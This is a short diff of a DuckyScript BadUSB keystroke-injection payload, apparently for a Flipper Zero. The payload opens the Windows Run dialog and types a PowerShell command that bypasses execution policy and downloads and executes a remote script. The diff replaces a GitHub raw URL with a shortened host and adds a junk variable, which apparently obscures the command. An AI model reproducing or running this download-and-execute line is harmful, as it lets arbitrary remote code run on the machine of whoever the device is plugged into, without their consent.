@@ -9,5 +9,5 @@ DEFAULT_DELAY 100
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C iex (irm raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/refs/heads/main/Icon-Rearranger/main.ps1)
+STRING powershell -Ep Bypass -C $raandomVar 'var'; iex (irm bw0.cc/icons)
 ENTER
